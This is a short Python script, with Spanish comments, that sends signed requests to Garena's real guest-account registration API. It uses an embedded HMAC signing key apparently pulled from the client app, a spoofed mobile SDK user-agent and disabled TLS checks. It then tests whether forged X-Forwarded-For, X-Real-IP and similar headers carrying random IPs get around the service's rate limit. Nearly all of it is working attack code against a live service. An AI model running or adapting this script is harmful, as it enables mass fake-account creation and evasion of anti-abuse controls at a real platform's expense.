import json, hmac, hashlib, time, random, requests, urllib3
urllib3.disable_warnings()

KEY = bytes.fromhex("32656534343831396539623435393838343531343130363762323831363231383734643064356437616639643866376530306331653534373135623764316533")
URL = "https://100067.connect.garena.com/api/v2/oauth/guest:register"
UA = "GarenaMSDK/4.0.42(SM-A525F;Android 12;en;US;)"

def shot(tag, spoof_ip=None):
    body = json.dumps({"app_id": 100067, "client_type": 2,
                       "password": f"Pass_{random.randrange(16**8):08X}", "source": 2},
                      separators=(",", ":"))
    sig = hmac.new(KEY, body.encode(), hashlib.sha256).hexdigest()
    h = {"User-Agent": UA, "Accept": "application/json",
         "Content-Type": "application/json; charset=utf-8",
         "Authorization": f"Signature {sig}"}
    if spoof_ip:
        for k in ("X-Forwarded-For", "X-Real-IP", "X-Client-IP", "CF-Connecting-IP", "True-Client-IP"):
            h[k] = spoof_ip
    try:
        r = requests.post(URL, headers=h, data=body, timeout=15, verify=False)
        print(f"{tag} -> {r.status_code} :: {r.text[:200]}")
        return r.status_code, r.text
    except Exception as e:
        print(f"{tag} -> ERR {e}")
        return None, str(e)

print("== enfriando 90s ==")
time.sleep(90)

shot("A sin spoof")
print("== probando si XFF salta el limite ==")
for i in range(3):
    time.sleep(3)
    shot(f"B spoof {i+1}", f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
